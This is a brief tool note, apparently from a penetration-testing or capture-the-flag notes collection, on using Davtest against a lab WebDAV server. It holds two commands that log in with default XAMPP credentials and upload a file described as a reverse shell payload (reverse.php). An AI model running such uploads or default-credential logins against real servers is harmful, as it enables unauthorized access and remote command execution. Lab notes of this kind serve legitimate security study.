# Davtest

Davtest tests WebDAV servers by uploading executable files and checking if they can be executed. It is useful for quickly identifying if a WebDAV directory allows remote command execution.

Used on: **bsidesgtdav**

## Commands Used

Scan a WebDAV server using basic authentication to test for file uploads and execution:

<!-- cmd: linux -->
```bash
davtest -url http://10.130.148.83/webdav/ -auth wampp:xampp
```

Upload a specific reverse shell payload:

<!-- cmd: linux -->
```bash
davtest -url http://10.130.148.83/webdav/ -auth wampp:xampp -uploadfile reverse.php -uploadloc reverse.php
```
